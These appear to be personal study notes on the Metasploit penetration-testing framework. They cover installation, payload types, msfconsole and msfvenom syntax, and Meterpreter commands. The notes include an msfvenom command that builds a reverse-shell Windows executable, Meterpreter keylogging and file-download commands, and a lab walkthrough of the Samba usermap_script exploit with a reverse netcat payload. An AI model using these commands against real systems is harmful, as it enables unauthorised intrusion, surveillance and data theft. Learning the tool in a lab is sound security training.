# Metasploit Framework - Setup and Documentations

```
Documentations on the scripts in Metasploit Framework
```

## Information

- Package Name :
    + Debian | apt : metasploit-framework
    + Archlinux | pacman : metasploit

### Payloads in Metasploit
- 3 Types of Payload
    - Singles : Payloads that are self-contained and standalone
        + Singles do not depend on other programs to run
    - Stagers : Stagers are small programs that *establish and main communications* between the attacker and victim
        + Usually to enable downloading of stages
        - Examples
            + Creating a backdoor
    - Stages : Payload components that are downloaded by the stagers 
        + usually Big
  
- How to understand payload descriptions in Metasploit
    + A single payload : windows/shell_bind_tcp
    - Stager-stages : windows/shell/bind_tcp
        - Where
            + bind_tcp : Stager
            + shell : stage
        - Summary
            + Map stager under the stage
            + *windows/stage/stager*

## Setup
### Pre-Requisites

### Dependencies
+ bundler
+ curl
+ gcc-mingw-w64-i686-win32
+ gcc-mingw-w64-x86-64-win32
+ git
+ john
+ libc6
+ libffi8
+ libgcc-s1
+ libpcap0.8
+ libpq5
+ libruby3.0
+ libsqlite3-0
+ libssl3
+ libstdc++6
+ nasm
+ nmap
+ openssl
+ oracle-instantclient-basic
+ postgresql
+ python3
+ rake
+ ruby
+ ruby-json
+ wget

### Installing
- Using package manager
    - Debian-based (apt)
        ```console
        sudo apt install metasploit-framework
        ```
    - Arch-based (pacman)
        ```console
        sudo pacman -S metasploit
        ```
   
## Documentation
### Scripts/Files
+ msfconsole    : Metasploit Framework's Console Shell
- msfvenom      : MSF Backdoor utility
    ```
    Generate and design a payload and output the payload file as an executable
    ```
+ meterpreter   : A payload that is used for post-exploitation (Once you get access to the target machine)
    
### msfconsole
#### Synopsis/Syntax

- To startup the framework
    ```console
    $> msfconsole [{options} [arguments]...]
    ```
    
#### Parameters
+ -q                                : Quiet mode (Little to no information)
+ -x [msfconsole shell commands]    : Execute Metasploit msfconsole shell commands from the terminal

#### Usage

### msfvenom

#### Synopsis/Syntax
```console
msfvenom {options} > payload_output_file
```

#### Parameters
+ -p [payload]                                          : Specify the payload to set in the executable
+ LHOST=[Listening Host (Client/Attacker) IP Address]   : Specify the Listener/Listening Host (Client/Attacker)
+ LPORT=[Listening Port Number]                          : Specify the port number to listen from
+ -f [file_extension_type]                              : Set the file extension/type of the output payload file

#### Usage
- Reverse TCP Payload
    ```console
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attacker IP] LPORT=5555 -f exe > shell.exe
    ```

### Shell
```
The functions here are all executable command used in a generated Shell Environment.
```
#### msfconsole
+ search [keyword]              : Look for possible exploits containing the keyword
    ```console
    msf5 > search ssh_version
    ```
+ use [path-to-exploit-script]  : Use a specific expoit, payload or auxiliary
- show [keyword]                : Displays information for the specified keyword
    - Examples
        + show options          : Display options for the current modules
        + show payloads         : Displays all payloads registered
- set [option] [value]          : Configure *option* to have a value of *value*
    - Options
        + PAYLOAD [payload-path]    : Set a payload
        + LHOST [attacker-IP]       : Sets the Local Host; Normally used to create a reverse connection to your machine after the attack succeeds
        + RHOST [target-IP]         : Sets the Remote/Target Host; Refers to the IP address of the target host
+ run [auxiliary-module]        : Execute *auxiliary* mode
+ exploit                       : Start *exploit* modules/execution process
+ back                          : Go back to the original console prompt
+ clear                         : Clear the screen
+ exit                          : Exit from metasploit
+ help                          : Show instructions
- sessions {options} [arguments]
    - Positional Arguments
        + Default (Empty): View opened sessions
            ```console
            msf6 > sessions
            ```
        - Select a session
            + Command : sessions [ID]
    - Options
        + -i : Get information about the current sessions
        + -l : List all sessions (when using background)
    - Suggestions
        - Useful metasploit commands for Meterpreter control
            + background : To show background current session
            + sessions -l : To list all sessions (when using background)
            + sessions -i [session_ID] : To interact with the session specified by session ID (also, to return to the current Meterpreter Mode)

#### Meterpreter Mode
- Keylogging
    + keyscan_start : Start Keylogging
    + keyscan_dump : Dump and output all keystrokes registered/logged
    + keyscan_stop : Stop Keystroke sniffing
- Information
    + sysinfo : Show system information of the target machine
    + ipconfig : Show network information of the target machine
    + ps : Show processes running on the target machine
    + getuid : To show a current user on the target machine
    + pwd : To get current working directory
    + ls : List directories
    + cat : To view a file
- File Management
    + download : To download the file from the target machine
    + upload : To upload the file to the target machine
    + execute -f [file] : To execute the specified file
- Actions
    + screenshot : To take screenshots of the target machine
- Movement
    + cd : To change directory
- Shell
    - shell : To change the current shell to the one running on the OS of the target machine
        + To return to the attacker shell : type *exit*
        
### Usage

- Information Gathering using Auxiliary Module
    - Launch msfconsole
        ```console
        $> msfconsole
        ```

    - Search ssh_version in msfconsole
        + *search ssh_version*
            ```console
            msf5> search ssh_version
            ```
    - Find a module name returned by Metasploit
        + auxiliary/scanner/ssh/ssh_version

    - Use auxiliary module
        - run *use auxiliary/scanner/ssh/ssh_version*
            + Your mode will be changed to auxiliary mode
            ```console
            msf5 > use auxiliary/scanner/ssh/ssh_version
            ```
            
    - Show options to execute
        + *show options*
            ```console
            msf5 > show options
            ```

    - Set RHOSTS as the target server's IP address (Metasploitable IP)
        + command : *set RHOSTS [target-IP]
        ```console
        msf5 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 10.0.2.5
        ```
        
    - Execute the auxiliary scanner
        + *run*
        ```console
        msf5 auxiliary(scanner/ssh/ssh_version) > run
        ```

- Samba "usermap script" exploit
    - Sequence of commands
        ```console
        $> msfconsole
        
        msf5 > use exploit/multi/samba/usermap_script
        msf5 > options
        msf5 > set RHOST 10.0.2.5
        msf5 > exploit
        ```
    - Different Payloads
        ```console
        msf5 > show payloads
        ```
    - Reverse Netcat
        + Ask the server to connect to us (Kali)
            ```console
            msf5 > set PAYLOAD cmd/unix/reverse_netcat
            msf5 > show options
            msf5 > set LHOST 10.0.2.4
            msf5 > exploit
            ```

## Wiki

### Scripts
- auxiliary
    > List of auxiliary
    - auxiliary/scanner/ssh/ssh_login
        - Options
            + USERNAME [username] : Set the username
            + USER_AS_PASS {true|false} : Set to use the username as the password
            + USERPASS_FILE [filename] : Set your own list of username and passwords
            + USER_FILE [filename] : Set your own list of usernames; User names only
- exploits
    > List of exploits
    + exploit/multi/handler
- payloads
    >List of payloads
    - Meterpreter
        - Linux
            + Reverse TCP : linux/x86/shell/reverse_tcp
        - Windows
            + Reverse TCP : windows/meterpreter/reverse_tcp 

### Terminologies
+ LHOST [attacker-IP]   : Sets the Local Host; Normally used to create a reverse connection to your machine after the attack succeeds
+ RHOST [target-IP]     : Sets the Remote/Target Host; Refers to the IP address of the target host    
+ Attack Vectors        : Methods of attacks
+ Attack Surface Area 	: Amount of loopholes/vulnerabilities/penetration methods in a program


